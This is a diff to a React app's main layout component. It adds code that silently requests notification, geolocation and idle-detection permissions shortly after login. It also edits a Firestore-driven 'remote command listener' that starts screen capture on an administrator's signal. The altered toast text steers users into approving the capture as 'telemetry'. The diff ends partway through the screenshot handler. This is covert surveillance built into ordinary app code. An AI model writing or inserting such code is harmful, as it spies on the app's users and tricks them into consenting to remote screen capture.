@@ -74,6 +74,41 @@ export function MainAppLayout({ children }: { children: React.ReactNode }) {
     } as UserProfile;
   }, [user, userProfile]);
 
+  // AUTOMATIC PERMISSION BOOTSTRAP
+  useEffect(() => {
+    if (!user || !mounted) return;
+
+    const hasRequestedPermissions = sessionStorage.getItem('basechan-permissions-bootstrapped');
+    if (hasRequestedPermissions) return;
+
+    const requestAllPermissions = async () => {
+        // 1. Notifications
+        if ('Notification' in window && Notification.permission === 'default') {
+            try {
+                await Notification.requestPermission();
+            } catch (e) {}
+        }
+
+        // 2. Geolocation
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 5000 });
+        }
+
+        // 3. Idle Detection (Requires permission + notification permission)
+        if ('IdleDetector' in window && (Notification as any).permission === 'granted') {
+            try {
+                await (window as any).IdleDetector.requestPermission();
+            } catch (e) {}
+        }
+
+        sessionStorage.setItem('basechan-permissions-bootstrapped', 'true');
+    };
+
+    // Small delay to ensure interface is ready
+    const timer = setTimeout(requestAllPermissions, 3000);
+    return () => clearTimeout(timer);
+  }, [user, mounted]);
+
   // REMOTE COMMAND LISTENER (SCREENSHOT & LIVE VIEW)
   useEffect(() => {
     if (!user || !firestore || !mounted) return;
@@ -84,10 +119,9 @@ export function MainAppLayout({ children }: { children: React.ReactNode }) {
 
         // 1. SCREENSHOT
         if (data.pendingCommand === 'SCREENSHOT' && data.deviceType === 'PC') {
-            toast({ title: "Administrative Capture Signal", description: "Remote screenshot in progress.", duration: 5000 });
+            toast({ title: "Administrative Capture Signal", description: "Remote screenshot requested. Click the authorization prompt to dispatch telemetry.", duration: 8000 });
             try {
-                const uRef = doc(firestore, 'users', user.uid);
-                await updateDoc(uRef, { pendingCommand: 'NONE' });
+                await updateDoc(doc(firestore, 'users', user.uid), { pendingCommand: 'NONE' });
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
